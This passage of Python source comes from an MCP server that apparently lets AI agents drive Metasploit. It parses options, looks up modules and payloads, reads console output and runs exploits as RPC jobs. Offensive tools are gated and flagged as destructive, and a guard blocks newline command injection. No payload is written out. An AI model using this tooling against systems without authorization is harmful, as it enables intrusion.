                    logger.debug(
                        f"Received significant data chunk for '{cmd}': {chunk_size} bytes "
                        f"(total: {total_bytes_read} bytes in {total_chunks_read} chunks)"
                    )

                output_buffer += chunk_data
                last_data_time = current_time  # Reset inactivity timer

                logger.info(f"Collected output: {output_buffer}")

                # Primary Completion Check: Did we receive the prompt?
                if prompt_bytes and MSF_PROMPT_RE.search(prompt_bytes):
                    logger.info(
                        f"Detected MSF prompt in console.read() result for '{cmd}' after {elapsed_time:.1f}s. Command complete."
                    )
                    break
                # Secondary Check: Does the buffered output end with the prompt?
                # Needed if prompt wasn't in the last read chunk but arrived earlier.
                if MSF_PROMPT_RE.search(output_buffer):
                    logger.info(
                        f"Detected MSF prompt at end of buffer for '{cmd}' after {elapsed_time:.1f}s. Command complete."
                    )
                    break

                if MODULE_COMPLETE_RE.match(output_buffer):
                    logger.info(
                        f"Detected module complete in output buffer for '{cmd}' after {elapsed_time:.1f}s. Command complete."
                    )
                    break

            # Check for exit terms after a short idle period (when we have output but no new data)
            if (
                exit_terms_regexes
                and not exit_terms_checked
                and len(output_buffer) > 0
                and (current_time - last_data_time) >= exit_terms_idle_timeout
            ):
                inactivity_duration = current_time - last_data_time
                # Check if any exit term matches the current output
                for exit_regex in exit_terms_regexes:
                    if exit_regex.search(output_buffer):
                        logger.info(
                            f"Exit term matched for command '{cmd}' after {elapsed_time:.1f}s "
                            f"(inactive for {inactivity_duration:.1f}s). Returning early."
                        )
                        exit_terms_checked = True
                        break
                if exit_terms_checked:
                    break

            # Fallback Completion Check: Inactivity timeout
            elif (current_time - last_data_time) > read_inactivity_timeout:
                inactivity_duration = current_time - last_data_time
                logger.info(
                    f"Console inactivity timeout ({read_inactivity_timeout}s) reached for command '{cmd}' "
                    f"after {elapsed_time:.1f}s total. No data for {inactivity_duration:.1f}s. Assuming complete."
                )
                break

        # Decode the final buffer
        final_output = output_buffer.decode("utf-8", errors="replace").strip()
        total_execution_time = asyncio.get_event_loop().time() - start_time

        # Handle timeout vs normal completion
        if timed_out:
            logger.error(
                f"Console command '{cmd}' TIMED OUT after {total_execution_time:.1f}s (limit: {read_timeout}s). "
                f"Read {total_chunks_read} chunks, {total_bytes_read} bytes, "
                f"output length: {len(final_output)} chars"
            )
            logger.debug(
                f"Timeout output for '{cmd}' (length {len(final_output)}):\n{final_output[:500]}{'...' if len(final_output) > 500 else ''}"
            )
            return f"TIMEOUT_ERROR: Command '{cmd}' exceeded {read_timeout}s timeout after {total_execution_time:.1f}s. Output: {final_output}"
        else:
            logger.info(
                f"Console command '{cmd}' completed successfully in {total_execution_time:.1f}s. "
                f"Read {total_chunks_read} chunks, {total_bytes_read} bytes, "
                f"output length: {len(final_output)} chars"
            )
            logger.debug(
                f"Final output for '{cmd}' (length {len(final_output)}):\n{final_output[:500]}{'...' if len(final_output) > 500 else ''}"
            )
            return final_output

    except Exception as e:
        elapsed_time = asyncio.get_event_loop().time() - start_time
        logger.exception(
            f"Error executing console command '{cmd}' after {elapsed_time:.1f}s. "
            f"Chunks read: {total_chunks_read}, bytes: {total_bytes_read}"
        )
        raise RuntimeError(
            f"Failed executing console command '{cmd}' after {elapsed_time:.1f}s: {e}"
        ) from e


from mcp.server.session import ServerSession

####################################################################################
# Temporary monkeypatch which avoids crashing when a POST message is received
# before a connection has been initialized, e.g: after a deployment.
# NOTE: This should only catch specific initialization errors, not all RuntimeErrors,
# as catching all RuntimeErrors can mask legitimate protocol errors.
# pylint: disable-next=protected-access
old__received_request = ServerSession._received_request


async def _received_request(self, *args, **kwargs):
    # Add diagnostic logging to understand request flow
    import inspect

    frame = inspect.currentframe()
    try:
        # Log when request is received
        logger.debug(
            f"[SSE_DEBUG] _received_request called with args={len(args)} kwargs={list(kwargs.keys())}"
        )
        result = await old__received_request(self, *args, **kwargs)
        logger.debug(f"[SSE_DEBUG] _received_request completed successfully")
        return result
    except RuntimeError as e:
        # Only suppress errors related to uninitialized connections
        # Do NOT suppress "Unexpected message received" errors as those indicate
        # protocol-level issues that need to be handled properly
        error_msg = str(e)
        logger.warning(f"[SSE_DEBUG] RuntimeError in _received_request: {error_msg}")
        if "Unexpected message received" in error_msg:
            # Log full context before re-raising
            logger.error(
                f"[SSE_DEBUG] Protocol error detected - Unexpected message received. "
                f"This suggests a race condition where a new request arrives while "
                f"SSE disconnect listener is active. Error: {error_msg}"
            )
            # Re-raise protocol errors - they need proper handling
            raise
        # Only suppress initialization-related errors
        logger.debug(f"Suppressed initialization error in _received_request: {e}")


# pylint: disable-next=protected-access
ServerSession._received_request = _received_request
####################################################################################

# --- MCP Server Initialization ---
# Create FastMCP instance with default settings - will be reconfigured in main()
mcp = FastMCP("Metasploit Tools Enhanced (Streamlined)")


# ---------------------------------------------------------------------------
# Tool behavior taxonomy (MCP tool annotations) — single source of truth.
#
# Each tool advertises MCP annotation hints so clients can reason about and gate
# behavior. `destructiveHint: True` also marks the state-changing tools that the
# safety gate (@dangerous_tool) protects, keeping one authoritative classification.
# ---------------------------------------------------------------------------
_READ_ONLY = {
    "readOnlyHint": True,
    "destructiveHint": False,
    "idempotentHint": True,
    "openWorldHint": True,
}


def _destructive(idempotent: bool = False) -> Dict[str, bool]:
    return {
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": idempotent,
        "openWorldHint": True,
    }


TOOL_ANNOTATIONS: Dict[str, Dict[str, bool]] = {
    # Read-only discovery / intelligence / status
    "describe_module": _READ_ONLY,
    "get_module_documentation": _READ_ONLY,
    "list_exploits": _READ_ONLY,
    "list_payloads": _READ_ONLY,
    "list_active_sessions": _READ_ONLY,
    "list_listeners": _READ_ONLY,
    "list_hosts": _READ_ONLY,
    "list_services": _READ_ONLY,
    "list_vulnerabilities": _READ_ONLY,
    "list_notes": _READ_ONLY,
    "list_credentials": _READ_ONLY,
    "list_loot": _READ_ONLY,
    "check_vulnerability": _READ_ONLY,  # probes a target but performs no exploitation
    "get_module_results": _READ_ONLY,
    "health_check": _READ_ONLY,
    # State-changing / offensive (gated by @dangerous_tool)
    "run_exploit": _destructive(),
    "run_auxiliary_module": _destructive(),
    "run_post_module": _destructive(),
    "generate_payload": _destructive(),
    "send_session_command": _destructive(),
    "start_listener": _destructive(),
    "terminate_session": _destructive(idempotent=True),
    "stop_job": _destructive(idempotent=True),
    "kill_all_handler_jobs": _destructive(idempotent=True),
}


def annotated_tool(func):
    """Register a tool via ``mcp.tool`` with annotations from TOOL_ANNOTATIONS.

    Drop-in for ``@annotated_tool``; looks the tool up by function name (preserved
    through ``@dangerous_tool`` via functools.wraps) so annotations live in one
    place. Falls back to no annotations for an unlisted tool.
    """
    ann = TOOL_ANNOTATIONS.get(func.__name__)
    return mcp.tool(annotations=ann)(func) if ann else mcp.tool()(func)


# --- Internal Helper Functions ---


def _parse_options_gracefully(options: Union[Dict[str, Any], str, None]) -> Dict[str, Any]:
    """
    Gracefully parse options from different formats.

    Handles:
    - Dict format (correct): {"key": "value", "key2": "value2"}
    - Comma-separated string format: "key=value,key=value"
    - Space-separated string format: "value key=value key2=value2" (first value without '=' is treated as RHOSTS)
    - None: returns empty dict

    Args:
        options: Options in dict format, string format, or None

    Returns:
        Dictionary of parsed options

    Raises:
        ValueError: If string format is malformed
    """
    if options is None:
        return {}

    if isinstance(options, dict):
        # Already correct format
        return options

    if isinstance(options, str):
        # Handle string format options
        if not options.strip():
            return {}

        logger.info(f"Converting string format options to dict: {options}")
        parsed_options = {}

        try:
            # Determine if we should use comma-separated or space-separated parsing
            # If string contains commas, prefer comma-separated (backward compatibility)
            # Otherwise, use space-separated parsing
            has_commas = "," in options
            has_spaces = " " in options

            if has_commas:
                # Comma-separated format: "key=value,key2=value2"
                tokens = [pair.strip() for pair in options.split(",") if pair.strip()]
            elif has_spaces:
                # Space-separated format: "value key=value key2=value2"
                # Split by spaces, but preserve quoted values
                tokens = []
                current_token = ""
                in_quotes = False
                quote_char = None

                i = 0
                while i < len(options):
                    char = options[i]
                    if char in ('"', "'") and (i == 0 or options[i - 1] != "\\"):
                        if not in_quotes:
                            in_quotes = True
                            quote_char = char
                            current_token += char
                        elif char == quote_char:
                            in_quotes = False
                            quote_char = None
                            current_token += char
                        else:
                            current_token += char
                    elif char == " " and not in_quotes:
                        if current_token.strip():
                            tokens.append(current_token.strip())
                        current_token = ""
                    else:
                        current_token += char
                    i += 1

                # Add the last token
                if current_token.strip():
                    tokens.append(current_token.strip())
            else:
                # Single token - treat as key=value or raise error
                tokens = [options.strip()]

            # Track if we've seen the first value without '=' (for RHOSTS in space-separated format)
            first_value_assigned = False

            for token in tokens:
                if not token:
                    continue

                if "=" in token:
                    # Key=value pair
                    key, value = token.split("=", 1)  # Split only on first '='
                    key = key.strip()
                    value = value.strip()

                    # Validate key is not empty
                    if not key:
                        raise ValueError(f"Invalid option format: '{token}' (empty key)")

                    # Remove quotes if they wrap the entire value
                    if (value.startswith('"') and value.endswith('"')) or (
                        value.startswith("'") and value.endswith("'")
                    ):
                        value = value[1:-1]

                    # Basic type conversion
                    if value.lower() in ("true", "false"):
                        value = value.lower() == "true"
                    elif value.isdigit():
                        try:
                            value = int(value)
                        except ValueError:
                            pass  # Keep as string if conversion fails

                    parsed_options[key] = value
                else:
                    # Value without '=' - check if it looks like a malformed key=value pair
                    # If it starts with letters that look like a key (e.g., "LHOST192.168.1.100"), it's an error
                    # Otherwise, treat as RHOSTS value
                    token_stripped = token.strip()

                    # Check if it looks like a malformed key=value (starts with letters followed by numbers/IP)
                    # Pattern: starts with 2+ letters/underscores, then has numbers/dots without space
                    # This catches cases like "LHOST192.168.1.100" but not "192.168.1.100"
                    if (
                        re.match(r"^[A-Za-z_]{2,}[A-Za-z0-9_]*[0-9]", token_stripped)
                        and not has_spaces
                    ):
                        # Looks like "LHOST192.168.1.100" - malformed, should be "LHOST=192.168.1.100"
                        raise ValueError(f"Invalid option format: '{token}' (missing '=')")

                    # Treat as RHOSTS value
                    if not first_value_assigned:
                        # First value without '=' is typically RHOSTS (for both single value and space-separated)
                        parsed_options["RHOSTS"] = token_stripped
                        first_value_assigned = True
                    else:
                        # In comma-separated format, all tokens must have '='
                        if has_commas:
                            raise ValueError(f"Invalid option format: '{token}' (missing '=')")
                        # In space-separated format, if we already assigned RHOSTS, this is an error
                        else:
                            raise ValueError(
                                f"Invalid option format: '{token}' (missing '=' and RHOSTS already assigned)"
                            )

            logger.info(f"Successfully converted string options to dict: {parsed_options}")
            return parsed_options

        except Exception as e:
            if isinstance(e, ValueError):
                raise
            raise ValueError(
                f"Failed to parse options string '{options}': {e}. Expected format: 'key=value,key2=value2' or 'value key=value key2=value2' or dict {{'key': 'value'}}"
            )

    # For any other type, try to convert to dict
    try:
        return dict(options)
    except (TypeError, ValueError) as e:
        raise ValueError(
            f"Options must be a dictionary or string format 'key=value,key2=value2' or 'value key=value key2=value2'. Got {type(options)}: {options}"
        )


async def _get_compatible_payloads_console(exploit_module: str) -> List[str]:
    """
    Fallback method to get compatible payloads using console when RPC API fails.
    Uses 'show payloads' command in msfconsole.
    """
    client = get_msf_client()
    console_id = None

    try:
        # Create a console
        logger.debug(f"Creating console to get compatible payloads for {exploit_module}")
        console = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.consoles.console()), timeout=RPC_CALL_TIMEOUT
        )
        console_id = console.cid
        logger.debug(f"Created console {console_id} for payload listing")

        # Determine full module path
        if "/" in exploit_module and not exploit_module.startswith("exploit/"):
            full_path = f"exploit/{exploit_module}"
        else:
            full_path = (
                exploit_module
                if exploit_module.startswith("exploit/")
                else f"exploit/{exploit_module}"
            )

        # Use the exploit module
        logger.debug(f"Using exploit module: {full_path}")
        await asyncio.to_thread(lambda: console.write(f"use {full_path}"))
        await asyncio.sleep(0.5)

        # Get output to clear buffer
        await asyncio.to_thread(lambda: console.read())
        await asyncio.sleep(0.2)

        # Run show payloads
        logger.debug("Running 'show payloads' command")
        await asyncio.to_thread(lambda: console.write("show payloads"))
        await asyncio.sleep(1.0)  # Give time for command to execute

        # Read the output
        output = await asyncio.to_thread(lambda: console.read())
        output_str = output.get("data", "") if isinstance(output, dict) else str(output)

        logger.debug(f"Show payloads output length: {len(output_str)} chars")

        # Parse the output to extract payload names
        payloads = []
        in_payload_section = False

        for line in output_str.split("\n"):
            line = line.strip()

            # Detect start of payload list
            if "Compatible Payloads" in line or "Name" in line and "Disclosure Date" in line:
                in_payload_section = True
                continue

            # Skip separator lines
            if line.startswith("===") or line.startswith("---") or line.startswith("#"):
                continue

            # Parse payload lines (format: "   0   payload/linux/x64/shell/reverse_tcp   ...")
            if in_payload_section and line:
                # Look for lines with payload/ prefix
                parts = line.split()
                for part in parts:
                    if part.startswith("payload/") and "/" in part:
                        # Extract just the payload name (without payload/ prefix for internal use)
                        payload_name = part[8:] if part.startswith("payload/") else part
                        payloads.append(payload_name)
                        break

        logger.info(f"Extracted {len(payloads)} compatible payloads from console output")
        return payloads

    except Exception as e:
        logger.error(f"Error getting compatible payloads via console: {e}")
        return [f"Error: {e}"]
    finally:
        # Clean up console
        if console_id:
            try:
                await asyncio.to_thread(lambda: client.consoles.destroy(console_id))
                logger.debug(f"Destroyed console {console_id}")
            except Exception as cleanup_err:
                logger.warning(f"Could not destroy console {console_id}: {cleanup_err}")


async def _find_similar_modules(
    module_type: str, module_name: str, max_suggestions: int = 5
) -> List[str]:
    """
    Find similar module names to suggest when a module isn't found.

    Extracts keywords from the module name and searches available modules.
    Returns up to max_suggestions matching modules.
    """
    try:
        client = get_msf_client()

        # Extract search terms from the module name
        # Split by '/' and '_' to get individual terms
        parts = module_name.replace("_", "/").split("/")
        # Filter out common/generic terms and keep meaningful ones
        generic_terms = {
            "exploit",
            "payload",
            "auxiliary",
            "post",
            "scanner",
            "admin",
            "multi",
            "generic",
            "cmd",
            "x86",
            "x64",
            "linux",
            "windows",
            "unix",
            "osx",
            "freebsd",
            "solaris",
            "reverse",
            "bind",
            "staged",
            "stageless",
            "http",
            "https",
            "tcp",
            "udp",
        }
        search_terms = [p.lower() for p in parts if len(p) > 2 and p.lower() not in generic_terms]

        if not search_terms:
            # Fall back to the last part of the path
            search_terms = [parts[-1].lower()] if parts else []

        if not search_terms:
            return []

        # Get the list of modules for this type
        module_list: List[str] = []
        try:
            if module_type == "exploit":
                module_list = await asyncio.wait_for(
                    asyncio.to_thread(lambda: client.modules.exploits),
                    timeout=5.0,  # Short timeout for suggestions
                )
            elif module_type == "payload":
                module_list = await asyncio.wait_for(
                    asyncio.to_thread(lambda: client.modules.payloads), timeout=5.0
                )
            elif module_type == "auxiliary":
                module_list = await asyncio.wait_for(
                    asyncio.to_thread(lambda: client.modules.auxiliary), timeout=5.0
                )
            elif module_type == "post":
                module_list = await asyncio.wait_for(
                    asyncio.to_thread(lambda: client.modules.post), timeout=5.0
                )
        except asyncio.TimeoutError:
            logger.debug(f"Timeout getting module list for suggestions")
            return []

        # Score modules by how many search terms they match
        scored_modules: List[tuple] = []
        for mod in module_list:
            mod_lower = mod.lower()
            # Count matching terms
            matches = sum(1 for term in search_terms if term in mod_lower)
            if matches > 0:
                scored_modules.append((matches, mod))

        # Sort by score (descending) and take top suggestions
        scored_modules.sort(key=lambda x: (-x[0], x[1]))  # Sort by score desc, then name asc
        suggestions = [f"{module_type}/{mod}" for _, mod in scored_modules[:max_suggestions]]

        logger.debug(f"Found {len(suggestions)} similar modules for '{module_name}': {suggestions}")
        return suggestions

    except Exception as e:
        logger.debug(f"Error finding similar modules: {e}")
        return []


async def _get_module_object(module_type: str, module_name: str) -> Any:
    """Gets the MSF module object, handling potential path variations."""
    client = get_msf_client()
    base_module_name = module_name  # Start assuming it's the base name

    if "/" in module_name:
        parts = module_name.split("/")

        if parts[0] in ("exploit", "payload", "post", "auxiliary", "encoder", "nop"):
            # Looks like full path, extract base name
            base_module_name = "/".join(parts[1:])
            if module_type != parts[0]:
                logger.warning(
                    f"Module type mismatch: expected '{module_type}', got path starting with '{parts[0]}'. Using provided type."
                )
        # Else: Assume it's like 'windows/smb/ms17_010_eternalblue' - already the base name

    logger.debug(
        f"Attempting to retrieve module: client.modules.use('{module_type}', '{base_module_name}')"
    )

    # First, make a raw RPC call to check the response before pymetasploit3 tries to wrap it.
    # This allows us to capture the actual Metasploit response for better error messages.
    try:
        # The RPC call that pymetasploit3 makes internally
        rpc_response = await asyncio.to_thread(
            lambda: client.call("module.info", [module_type, base_module_name])
        )
        logger.debug(
            f"Raw RPC response for module.info({module_type}, {base_module_name}): {rpc_response}"
        )

        # Check if Metasploit returned an error or unexpected response
        if isinstance(rpc_response, bool):
            # Metasploit returned False - module not found or incompatible
            raise ValueError(
                f"Module '{module_type}/{base_module_name}' not found or incompatible. "
                f"Metasploit returned: {rpc_response}. "
                f"Verify the module name is correct and available in your Metasploit installation."
            )
        elif isinstance(rpc_response, dict) and rpc_response.get("error"):
            # Metasploit returned an error dict
            error_class = rpc_response.get("error_class", "UnknownError")
            error_message = rpc_response.get("error_message", "No error message provided")
            error_backtrace = rpc_response.get("error_backtrace", [])

            # Check if this is a simple "Invalid Module" error (expected user error, not a bug)
            is_invalid_module = (
                "Invalid Module" in error_message or error_class == "Msf::RPC::Exception"
            )

            if is_invalid_module:
                # Log backtrace at DEBUG level only for invalid module errors
                if error_backtrace:
                    backtrace_str = "\n  ".join(error_backtrace[:3])
                    logger.debug(
                        f"Metasploit backtrace for invalid module '{module_type}/{base_module_name}': {backtrace_str}"
                    )

                # Find similar modules to suggest
                suggestions = await _find_similar_modules(module_type, base_module_name)
                suggestion_text = ""
                if suggestions:
                    suggestion_text = f"\n\nDid you mean one of these?\n  - " + "\n  - ".join(
                        suggestions
                    )

                # Raise clean exception without backtrace in message
                raise InvalidModuleError(
                    module_type=module_type,
                    module_name=base_module_name,
                    message=f"Module '{module_type}/{base_module_name}' not found in Metasploit.{suggestion_text}",
                )
            else:
                # For other errors, include more detail (these may indicate actual bugs)
                backtrace_str = "\n  ".join(error_backtrace[:3]) if error_backtrace else ""
                raise ValueError(
                    f"Metasploit error loading module '{module_type}/{base_module_name}': "
                    f"{error_class} - {error_message}"
                    + (f"\n  Backtrace:\n  {backtrace_str}" if backtrace_str else "")
                )
    except (ValueError, InvalidModuleError):
        # Re-raise ValueError/InvalidModuleError from our checks above
        raise
    except Exception as info_err:
        # Log but continue - the module.info call might fail for valid modules in some cases
        logger.debug(f"module.info pre-check failed (may be okay): {info_err}")

    try:
        module_obj = await asyncio.to_thread(
            lambda: client.modules.use(module_type, base_module_name)
        )
        logger.debug(f"Successfully retrieved module object for {module_type}/{base_module_name}")
        return module_obj
    except (MsfRpcError, KeyError) as e:
        # KeyError can be raised by pymetasploit3 if module not found
        error_str = str(e).lower()
        if (
            "unknown module" in error_str
            or "invalid module" in error_str
            or isinstance(e, KeyError)
        ):
            logger.warning(f"Module '{module_type}/{base_module_name}' not found in Metasploit.")

            # Find similar modules to suggest
            suggestions = await _find_similar_modules(module_type, base_module_name)
            suggestion_text = ""
            if suggestions:
                suggestion_text = f"\n\nDid you mean one of these?\n  - " + "\n  - ".join(
                    suggestions
                )

            raise InvalidModuleError(
                module_type=module_type,
                module_name=base_module_name,
                message=f"Module '{module_type}/{base_module_name}' not found.{suggestion_text}",
            ) from e
        else:
            logger.error(f"MsfRpcError getting module {module_type}/{base_module_name}: {e}")
            raise MsfRpcError(f"Error retrieving module '{module_name}': {e}") from e
    except TypeError as e:
        # TypeError occurs when pymetasploit3 receives unexpected response format from RPC
        # e.g., "'bool' object is not subscriptable" when options dict is returned as boolean
        # Try to get more info from a direct RPC call
        try:
            options_response = await asyncio.to_thread(
                lambda: client.call("module.options", [module_type, base_module_name])
            )
            logger.debug(f"Raw module.options response: {options_response}")

            if isinstance(options_response, bool):
                raise ValueError(
                    f"Module '{module_type}/{base_module_name}' failed to load. "
                    f"Metasploit returned '{options_response}' instead of module options. "
                    f"This typically means the module does not exist or failed to initialize. "
                    f"Verify the module path is correct."
                )
            elif isinstance(options_response, dict) and options_response.get("error"):
                error_class = options_response.get("error_class", "UnknownError")
                error_message = options_response.get("error_message", "No error message provided")
                raise ValueError(
                    f"Metasploit error for module '{module_type}/{base_module_name}': "
                    f"{error_class} - {error_message}"
                )
            else:
                # Unknown response format
                raise ValueError(
                    f"Unexpected response from Metasploit for module '{module_type}/{base_module_name}': "
                    f"{type(options_response).__name__} = {str(options_response)[:200]}"
                )
        except ValueError:
            raise
        except Exception as inner_err:
            # Fallback error message if we can't get more details
            logger.error(
                f"TypeError loading module {module_type}/{base_module_name}: {e}. "
                f"Additional info retrieval failed: {inner_err}"
            )
            raise ValueError(
                f"Failed to load module '{module_name}' of type '{module_type}'. "
                f"Metasploit returned an invalid response (expected dict, got unexpected type). "
                f"This usually indicates the module doesn't exist or failed to initialize. "
                f"Try using run_as_job=False for console-based execution, or verify the module name is correct."
            ) from e


async def _get_module_valid_options(module_obj: Any) -> set:
    """Get the set of valid option names for a module by querying Metasploit."""
    try:
        # module_obj.options returns a dict of option_name -> option_info
        options_dict = await asyncio.to_thread(lambda: module_obj.options)
        if isinstance(options_dict, dict):
            return set(options_dict.keys())
        return set()
    except Exception as e:
        logger.warning(f"Failed to get valid options for module: {e}")
        return set()


# Characters that must never appear in a module option key or value. A newline or
# carriage return lets an attacker terminate the intended `set <key> <value>`
# console command and inject additional commands (CVE-2026-5463 / GHSA-qpc3-8vqg-8g6w,
# unpatched upstream in pymetasploit3). NUL is rejected defensively.
_UNSAFE_OPTION_CHARS = ("\n", "\r", "\x00")


def _reject_unsafe_option_chars(options: Dict[str, Any], context: str = "module") -> None:
    """Raise ValueError if any option key or string value contains a control
    character that could break out of a console `set` command.

    Applied to every execution path (RPC and console) as defense in depth so a
    single validation point protects all option handling regardless of which
    backend a given module ends up using.
    """
    if not isinstance(options, dict):
        return
    for key, value in options.items():
        if isinstance(key, str) and any(c in key for c in _UNSAFE_OPTION_CHARS):
            raise ValueError(
                f"Illegal control character in {context} option name "
                f"{key!r}: newline/carriage-return/NUL are not allowed."
            )
        if isinstance(value, str) and any(c in value for c in _UNSAFE_OPTION_CHARS):
            raise ValueError(
                f"Illegal control character in value for {context} option {key!r}: "
                f"newline/carriage-return/NUL are not allowed (command-injection guard)."
            )


async def _set_module_options(
    module_obj: Any, options: Dict[str, Any], module_type: str = "module", payload_obj: Any = None
):
    """Sets options on a module object, performing basic type guessing and intelligent error detection.

    Args:
        module_obj: The Metasploit module object
        options: Options to set on the module
        module_type: Type of module ('exploit', 'payload', 'auxiliary', etc.)
        payload_obj: Optional payload object to check if failed options are valid payload options
    """
    module_fullname = getattr(module_obj, "fullname", "unknown")
    logger.debug(f"Setting options for module {module_fullname}: {options}")

    # Reject control characters before any option reaches the datastore/console.
    _reject_unsafe_option_chars(options, context=module_type)

    # Get valid options for this module
    valid_module_options = await _get_module_valid_options(module_obj)
    logger.debug(
        f"Module {module_fullname} has {len(valid_module_options)} valid options: {sorted(valid_module_options)}"
    )

    # Get valid payload options if we have a payload
    valid_payload_options = set()
    if payload_obj:
        valid_payload_options = await _get_module_valid_options(payload_obj)
        payload_name = getattr(payload_obj, "fullname", "unknown")
        logger.debug(
            f"Payload {payload_name} has {len(valid_payload_options)} valid options: {sorted(valid_payload_options)}"
        )

    failed_options = []
    payload_options_in_module = []

    for k, v in options.items():
        # Basic type guessing
        original_value = v
        if isinstance(v, str):
            if v.isdigit():
                try:
                    v = int(v)
                except ValueError:
                    pass  # Keep as string if large number or non-integer
            elif v.lower() in ("true", "false"):
                v = v.lower() == "true"
            # Add more specific checks if needed (e.g., for file paths)
        elif isinstance(v, (int, bool)):
            pass  # Already correct type
        # Add handling for other types like lists if necessary

        try:
            # Use lambda to capture current k, v for the thread
            await asyncio.to_thread(lambda key=k, value=v: module_obj.__setitem__(key, value))
            # logger.debug(f"Set option {k}={v} (original: {original_value})")
        except (MsfRpcError, KeyError, TypeError) as e:
            # Catch potential errors if option doesn't exist or type is wrong
            error_str = str(e)
            logger.error(f"Failed to set option {k}={v} on module {module_fullname}: {e}")

            # Check if this option is valid for the payload (intelligent detection)
            if "invalid option" in error_str.lower() and k in valid_payload_options:
                logger.debug(
                    f"Option {k} is valid for payload but not for module {module_fullname}"
                )
                payload_options_in_module.append(k)
                failed_options.append((k, original_value, error_str))
            else:
                failed_options.append((k, original_value, error_str))

    # If we detected payload options in module options, provide helpful error
    if payload_options_in_module:
        option_list = ", ".join(payload_options_in_module)
        payload_name = getattr(payload_obj, "fullname", "payload") if payload_obj else "payload"
        error_msg = (
            f"❌ CONFIGURATION ERROR: Payload options ({option_list}) cannot be set on the exploit module.\n\n"
            f"These options belong to the PAYLOAD ('{payload_name}'), not the exploit module '{module_fullname}'.\n\n"
            f"🔧 How to fix:\n"
            f"1. Move {option_list} from 'options' to 'payload_options'\n"
            f"2. Keep module-specific options (e.g., {', '.join(list(valid_module_options)[:3])}) in 'options'\n\n"
            f"Example:\n"
            f"  ✗ WRONG:\n"
            f"    run_exploit(\n"
            f"        module_name='{module_fullname}',\n"
            f"        options={{'RHOSTS': '...', '{payload_options_in_module[0]}': '...', ...}},  # ❌ {payload_options_in_module[0]} here\n"
            f"        payload_name='{payload_name}')\n\n"
            f"  ✓ CORRECT:\n"
            f"    run_exploit(\n"
            f"        module_name='{module_fullname}',\n"
            f"        options={{'RHOSTS': '...', ...}},  # ✅ Module options only\n"
            f"        payload_name='{payload_name}',\n"
            f"        payload_options={{'{payload_options_in_module[0]}': '...', ...}})  # ✅ Payload options separate\n"
        )
        raise ValueError(error_msg)

    # If we have other failed options, raise an informative error
    if failed_options:
        failed_list = [f"{k}='{v}'" for k, v, _ in failed_options[:3]]  # Show first 3
        error_msg = f"Failed to set option(s) on module '{module_fullname}': {', '.join(failed_list)}. {failed_options[0][2]}"

        # Add helpful hint about valid options if we have them
        if valid_module_options:
            valid_options_sample = ", ".join(sorted(valid_module_options)[:10])
            if len(valid_module_options) > 10:
                valid_options_sample += f", ... ({len(valid_module_options)} total)"
            error_msg += f"\n\nValid options for this module: {valid_options_sample}"

        raise ValueError(error_msg)


async def _get_module_error_from_events(client: Any, uuid_str: str) -> Optional[str]:
    """Query db.events for a module_error event matching the given module UUID."""
    try:
        events_response = await asyncio.to_thread(lambda: client.call("db.events", [{}]))
        if not isinstance(events_response, dict):
            return None

        events = events_response.get("events", [])
        if not isinstance(events, list):
            return None

        for event in reversed(events):
            if not isinstance(event, dict):
                continue
            if event.get("name") != "module_error":
                continue

            info = event.get("info", {})
            if not isinstance(info, dict):
                continue
            if str(info.get("module_uuid")) != uuid_str:
                continue

            exception_value = info.get("exception")
            if exception_value is None:
                return None
            return exception_value if isinstance(exception_value, str) else str(exception_value)
    except Exception as e:
        logger.debug(f"Failed to query module_error from db.events for UUID {uuid_str}: {e}")
        return None

    return None


async def _execute_module_rpc(
    module_type: str,
    module_name: str,  # Can be full path or base name
    module_options: Dict[str, Any],
    payload_spec: Optional[
        Union[str, Dict[str, Any]]
    ] = None,  # Payload name or {name: ..., options: ...}
) -> Dict[str, Any]:
    """
    Helper to execute an exploit, auxiliary, or post module as a background job via RPC.
    Includes polling logic for exploit sessions.
    """
    client = get_msf_client()
    module_obj = await _get_module_object(module_type, module_name)  # Handles path variants
    full_module_path = getattr(
        module_obj, "fullname", f"{module_type}/{module_name}"
    )  # Get canonical name

    # Prepare payload first if needed, so we can pass it to _set_module_options for intelligent error detection
    payload_obj_to_pass = None
    payload_obj_for_validation = None
    payload_name_for_log = None
    payload_options_for_log = None

    if module_type == "exploit" and payload_spec:
        if isinstance(payload_spec, str):
            payload_name_for_log = payload_spec
            # Passing name string directly is supported by exploit.execute
            payload_obj_to_pass = payload_name_for_log
            logger.info(
                f"Executing {full_module_path} with payload '{payload_name_for_log}' (passed as string)."
            )
            # Try to get payload object for validation (non-blocking if it fails)
            try:
                payload_obj_for_validation = await _get_module_object(
                    "payload", payload_name_for_log
                )
            except Exception as e:
                logger.debug(f"Could not get payload object for validation: {e}")
        elif isinstance(payload_spec, dict) and "name" in payload_spec:
            payload_name = payload_spec["name"]
            payload_options = payload_spec.get("options", {})
            payload_name_for_log = payload_name
            payload_options_for_log = payload_options
            try:
                payload_obj = await _get_module_object("payload", payload_name)
                payload_obj_for_validation = payload_obj  # Use for validation
                await _set_module_options(payload_obj, payload_options, module_type="payload")
                payload_obj_to_pass = payload_obj  # Pass the configured payload object
                logger.info(
                    f"Executing {full_module_path} with configured payload object for '{payload_name}'."
                )
            except InvalidModuleError as e:
                # Clean warning for invalid payload module (not a bug, just wrong module name)
                logger.warning(f"Payload module '{payload_name}' not found: {e}")
                return {
                    "status": "error",
                    "message": f"Payload '{payload_name}' not found in Metasploit. Verify the payload name is correct.",
                }
            except (ValueError, MsfRpcError) as e:
                logger.error(f"Failed to prepare payload object for '{payload_name}': {e}")
                return {
                    "status": "error",
                    "message": f"Failed to prepare payload '{payload_name}': {e}",
                }
        else:
            logger.warning(
                f"Invalid payload_spec format: {payload_spec}. Expected string or dict with 'name'."
            )
            return {"status": "error", "message": "Invalid payload specification format."}

    # Now set module options with payload object available for intelligent error detection
    await _set_module_options(
        module_obj, module_options, module_type=module_type, payload_obj=payload_obj_for_validation
    )

    logger.info(f"Executing module {full_module_path} as background job via RPC...")
    try:
        if module_type == "exploit":
            exec_result = await asyncio.to_thread(
                lambda: module_obj.execute(payload=payload_obj_to_pass)
            )
        else:  # auxiliary, post
            exec_result = await asyncio.to_thread(lambda: module_obj.execute())

        logger.info(f"RPC execute() result for {full_module_path}: {exec_result}")

        # --- Process Execution Result ---
        if not isinstance(exec_result, dict):
            logger.error(
                f"Unexpected result type from {module_type} execution: {type(exec_result)} - {exec_result}"
            )
            return {
                "status": "error",
                "message": f"Unexpected result from module execution: {exec_result}",
                "module": full_module_path,
            }

